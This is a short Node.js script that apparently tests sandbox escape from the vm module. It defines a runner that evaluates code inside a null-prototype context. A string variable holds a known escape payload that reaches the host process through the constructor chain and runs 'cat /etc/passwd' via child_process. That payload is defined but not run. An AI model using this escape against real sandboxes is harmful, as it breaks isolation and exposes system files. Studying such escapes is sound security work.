const vm = require('vm')
const fs = require('fs')

let result = ''

const code = 'var a =1; a'
const code2 = `this.constructor.constructor('return this.process')();
process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()`

const genRunner = function() {
  return function run(code) {
    const result = new Function(`return eval(${JSON.stringify(code)})`)
    // send('end', result);
    return result()
  }
}


const run = function() {
  const context = vm.createContext(Object.create(null))
  const runner = vm.runInContext(`(${genRunner.toString()})()`, context)
  // const runner2 = vm.runInContext(code, context)
  // console.log('runner2', runner2)
  try {
    const a = runner(code)
  } catch(e) {
    result += e.name + e.message
  }
}


run()